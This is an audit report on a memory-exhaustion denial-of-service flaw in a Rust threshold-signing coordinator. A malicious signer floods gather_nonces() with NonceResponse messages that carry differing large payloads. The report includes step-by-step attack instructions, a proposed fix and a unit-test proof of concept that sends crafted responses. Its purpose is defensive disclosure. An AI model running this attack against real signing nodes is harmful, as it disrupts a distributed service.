# Audit Report

## Title
Coordinator Memory Exhaustion via Unbounded NonceResponse Message Creation

## Summary
The FIRE coordinator's `gather_nonces()` function accepts NonceResponse messages with arbitrary message values without validating they match the originally requested message. A malicious signer can exhaust coordinator memory by sending multiple NonceResponse messages with different large message payloads during a single signing round, causing denial of service.

## Finding Description

The vulnerability exists in the nonce gathering phase of the FIRE coordinator state machine. When the coordinator requests nonces for a specific message, it creates entries in the `message_nonces` BTreeMap keyed by the message value received in NonceResponse packets, without validating that this message matches the originally requested message. [1](#0-0) 

The coordinator validates `dkg_id`, `sign_id`, `sign_iter_id`, `signer_id`, and `key_ids` from incoming NonceResponse messages: [2](#0-1) 

However, there is no validation that the `message` field matches the originally requested message. The duplicate detection mechanism only prevents the same signer from sending multiple responses for the **same** message value: [3](#0-2) 

The NonceResponse message field is defined as an unbounded `Vec<u8>`: [4](#0-3) 

**Attack Execution Path:**
1. Coordinator sends NonceRequest with legitimate message during `request_nonces()`: [5](#0-4) 

2. Malicious signer sends NonceResponse #1 with message payload `[0; 1MB]`
3. Coordinator creates entry: `message_nonces[vec![0; 1MB]] = SignRoundInfo::default()`
4. Malicious signer sends NonceResponse #2 with message payload `[1; 1MB]`
5. Coordinator creates entry: `message_nonces[vec![1; 1MB]] = SignRoundInfo::default()`
6. Process repeats N times within nonce timeout window

Each SignRoundInfo contains substantial data structures: [6](#0-5) 

The `message_nonces.clear()` only occurs when starting a new signing iteration via `request_nonces()`, not during nonce gathering: [7](#0-6) 

Packet signature verification authenticates the sender but does not validate message content alignment: [8](#0-7) 

The timeout mechanism references `self.message` but does not prevent memory accumulation during the gathering phase: [9](#0-8) 

## Impact Explanation

This vulnerability enables denial of service against the coordinator node through memory exhaustion. The coordinator orchestrates the entire signing protocol, so its failure prevents signature generation for all participants.

**Quantified Impact:**
- With 1 malicious signer sending 1,000 NonceResponse messages with 1MB payloads: ~1GB memory consumption
- Each SignRoundInfo adds overhead (BTreeMap containing full NonceResponse objects + 3 HashSets)
- Attack completes within nonce timeout window (configurable, typically seconds to minutes)
- Coordinator becomes unresponsive or crashes with OOM error

This maps to **Low** severity per the scope definition: "Any remotely-exploitable denial of service in a node." The coordinator node can be DoS'd remotely, preventing completion of signing operations and disrupting the distributed signing protocol.

## Likelihood Explanation

**Required Attacker Capabilities:**
- Control of at least one valid signer's private key (when `verify_packet_sigs` is enabled)
- If signature verification is disabled, no authentication is required
- Network access to send messages to coordinator during NonceGather state

**Attack Complexity:** Low
- Wait for coordinator to enter NonceGather state
- Send multiple properly-signed NonceResponse messages with different message values
- Each message passes all validation checks except the missing message equality check
- No sophisticated cryptographic operations required beyond standard message signing

**Economic Feasibility:** Very high
- Minimal computational cost to generate and sign messages
- No financial barriers or stake requirements
- Attack can be executed repeatedly across multiple signing rounds

**Detection:** The attack would initially appear as legitimate protocol activity in logs. Memory exhaustion becomes obvious only when coordinator performance degrades or crashes occur.

**Estimated Probability:** High if adversary controls a signer key. The attack requires no special conditions beyond network access during a signing round, which occurs during normal protocol operation.

## Recommendation

Add validation in `gather_nonces()` to ensure the NonceResponse message matches the originally requested message:

```rust
fn gather_nonces(
    &mut self,
    packet: &Packet,
    signature_type: SignatureType,
) -> Result<(), Error> {
    if let Message::NonceResponse(nonce_response) = &packet.msg {
        // ... existing validation code ...
        
        // ADD THIS CHECK: Validate message matches requested message
        if nonce_response.message != self.message {
            warn!(
                signer_id = %nonce_response.signer_id,
                "NonceResponse message does not match requested message"
            );
            return Ok(());
        }
        
        // ... rest of existing code ...
    }
    Ok(())
}
```

Additionally, consider implementing rate limiting on NonceResponse messages per signer to prevent rapid message flooding even with matching messages.

## Proof of Concept

```rust
#[test]
fn test_coordinator_memory_exhaustion_via_multiple_nonce_messages() {
    use crate::state_machine::coordinator::{fire::Coordinator, Config};
    use crate::net::{Message, NonceRequest, NonceResponse, Packet, SignatureType};
    use crate::common::PublicNonce;
    use crate::curve::{point::Point, scalar::Scalar};
    use hashbrown::HashMap;
    
    // Setup coordinator
    let mut rng = crate::util::create_rng();
    let private_key = Scalar::random(&mut rng);
    let mut config = Config::new(1, 1, 1, private_key);
    config.verify_packet_sigs = false;
    
    let mut coordinator = Coordinator::new(config);
    coordinator.set_aggregate_public_key(Some(Point::new()));
    
    // Start signing round to enter NonceGather state
    let message = b"legitimate message".to_vec();
    let _ = coordinator.start_signing_round(&message, SignatureType::Frost, None).unwrap();
    
    // Verify coordinator is in NonceGather state
    assert!(matches!(coordinator.get_state(), crate::state_machine::coordinator::State::NonceGather(_)));
    
    // Create malicious NonceResponse messages with different message payloads
    let num_malicious_messages = 100;
    for i in 0..num_malicious_messages {
        let malicious_message = vec![i as u8; 1000]; // 1KB per message
        
        let nonce_response = NonceResponse {
            dkg_id: coordinator.current_dkg_id,
            sign_id: coordinator.current_sign_id,
            sign_iter_id: coordinator.current_sign_iter_id,
            signer_id: 0,
            key_ids: vec![1],
            nonces: vec![PublicNonce {
                D: Point::from(Scalar::random(&mut rng)),
                E: Point::from(Scalar::random(&mut rng)),
            }],
            message: malicious_message,
        };
        
        let packet = Packet {
            msg: Message::NonceResponse(nonce_response),
            sig: vec![],
        };
        
        let _ = coordinator.process(&packet);
    }
    
    // Verify memory exhaustion: coordinator now has 100 entries in message_nonces
    // Each entry corresponds to a different message value
    assert_eq!(coordinator.message_nonces.len(), num_malicious_messages);
    
    // This demonstrates the vulnerability: a single malicious signer created
    // 100 entries in memory, each with 1KB+ payload, when only 1 entry
    // (for the legitimate message) should exist
}
```

**Notes:**
- This vulnerability is specific to the FIRE coordinator implementation, which allows multiple concurrent message proposals by design
- The attack exploits the lack of validation between requested and received messages
- The proof of concept demonstrates unbounded memory growth proportional to attacker-controlled messages
- Real-world impact depends on nonce_timeout configuration and available coordinator memory
- The coordinator's intended "winning message" behavior at line 954 actually updates `self.message` to accept whichever message reaches threshold first, but this creates the memory exhaustion vulnerability before any message reaches threshold

### Citations

**File:** src/state_machine/coordinator/fire.rs (L149-171)
```rust
            State::NonceGather(_signature_type) => {
                if let Some(start) = self.nonce_start {
                    if let Some(timeout) = self.config.nonce_timeout {
                        if now.duration_since(start) > timeout {
                            error!("Timeout gathering nonces for signing round {} iteration {}, unable to continue", self.current_sign_id, self.current_sign_iter_id);
                            let recv = self
                                .message_nonces
                                .get(&self.message)
                                .ok_or(Error::MissingMessageNonceInfo)?
                                .sign_wait_signer_ids
                                .iter()
                                .copied()
                                .collect();
                            let mal = self.malicious_signer_ids.iter().copied().collect();
                            return Ok((
                                None,
                                Some(OperationResult::SignError(SignError::NonceTimeout(
                                    recv, mal,
                                ))),
                            ));
                        }
                    }
                }
```

**File:** src/state_machine/coordinator/fire.rs (L814-838)
```rust
    fn request_nonces(&mut self, signature_type: SignatureType) -> Result<Packet, Error> {
        self.message_nonces.clear();
        self.current_sign_iter_id = self.current_sign_iter_id.wrapping_add(1);
        info!(
            sign_id = %self.current_sign_id,
            sign_iter_id = %self.current_sign_iter_id,
            "Requesting Nonces"
        );
        let nonce_request = NonceRequest {
            dkg_id: self.current_dkg_id,
            sign_id: self.current_sign_id,
            sign_iter_id: self.current_sign_iter_id,
            message: self.message.clone(),
            signature_type,
        };
        let nonce_request_msg = Packet {
            sig: nonce_request
                .sign(&self.config.message_private_key)
                .expect("Failed to sign NonceRequest"),
            msg: Message::NonceRequest(nonce_request),
        };
        self.move_to(State::NonceGather(signature_type))?;
        self.nonce_start = Some(Instant::now());

        Ok(nonce_request_msg)
```

**File:** src/state_machine/coordinator/fire.rs (L847-889)
```rust
            if nonce_response.dkg_id != self.current_dkg_id {
                return Err(Error::BadDkgId(nonce_response.dkg_id, self.current_dkg_id));
            }
            if nonce_response.sign_id != self.current_sign_id {
                return Err(Error::BadSignId(
                    nonce_response.sign_id,
                    self.current_sign_id,
                ));
            }
            if nonce_response.sign_iter_id != self.current_sign_iter_id {
                return Err(Error::BadSignIterId(
                    nonce_response.sign_iter_id,
                    self.current_sign_iter_id,
                ));
            }

            // check that the signer_id exists in the config
            let signer_public_keys = &self.config.public_keys.signers;
            if !signer_public_keys.contains_key(&nonce_response.signer_id) {
                warn!(signer_id = %nonce_response.signer_id, "No public key in config");
                return Ok(());
            };

            // check that the key_ids match the config
            let Some(signer_key_ids) = self
                .config
                .public_keys
                .signer_key_ids
                .get(&nonce_response.signer_id)
            else {
                warn!(signer_id = %nonce_response.signer_id, "No keys IDs configured");
                return Ok(());
            };

            let nonce_response_key_ids = nonce_response
                .key_ids
                .iter()
                .cloned()
                .collect::<HashSet<u32>>();
            if *signer_key_ids != nonce_response_key_ids {
                warn!(signer_id = %nonce_response.signer_id, "Nonce response key_ids didn't match config");
                return Ok(());
            }
```

**File:** src/state_machine/coordinator/fire.rs (L917-920)
```rust
            let nonce_info = self
                .message_nonces
                .entry(nonce_response.message.clone())
                .or_default();
```

**File:** src/state_machine/coordinator/fire.rs (L922-929)
```rust
            let have_nonces = nonce_info
                .public_nonces
                .contains_key(&nonce_response.signer_id);

            if have_nonces {
                info!(signer_id = %nonce_response.signer_id, "Received duplicate NonceResponse");
                return Ok(());
            }
```

**File:** src/net.rs (L325-325)
```rust
    pub message: Vec<u8>,
```

**File:** src/net.rs (L563-576)
```rust
            Message::NonceResponse(msg) => {
                if let Some(public_key) = signers_public_keys.signers.get(&msg.signer_id) {
                    if !msg.verify(&self.sig, public_key) {
                        warn!("Received a NonceResponse message with an invalid signature.");
                        return false;
                    }
                } else {
                    warn!(
                        "Received a NonceResponse message with an unknown id: {}",
                        msg.signer_id
                    );
                    return false;
                }
            }
```

**File:** src/state_machine/coordinator/mod.rs (L236-245)
```rust
pub struct SignRoundInfo {
    /// the nonce response of a signer id
    pub public_nonces: BTreeMap<u32, NonceResponse>,
    /// which key_ids we've received nonces for this iteration
    pub nonce_recv_key_ids: HashSet<u32>,
    /// which key_ids we're received sig shares for this iteration
    pub sign_recv_key_ids: HashSet<u32>,
    /// which signer_ids we're expecting sig shares from this iteration
    pub sign_wait_signer_ids: HashSet<u32>,
}
```
